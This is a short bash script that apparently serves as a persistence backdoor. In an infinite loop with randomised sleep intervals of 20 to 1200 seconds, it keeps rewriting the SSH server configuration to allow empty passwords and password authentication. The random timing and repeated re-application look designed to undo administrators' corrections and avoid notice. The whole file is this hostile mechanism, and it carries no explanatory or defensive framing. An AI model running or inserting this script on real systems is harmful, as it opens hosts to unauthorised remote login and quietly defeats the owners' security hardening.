#!/bin/bash

min_time=20
max_time=1200

sleep_time=$(shuf -i $min_time-$max_time -n 1)

while true; do
  sed -i 's/^PermitEmptyPasswords.*/PermitEmptyPasswords yes/' /etc/ssh/sshd_config
  sed -i 's/^PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
  sleep $sleep_time
  sleep_time=$(shuf -i $min_time-$max_time -n 1)
done
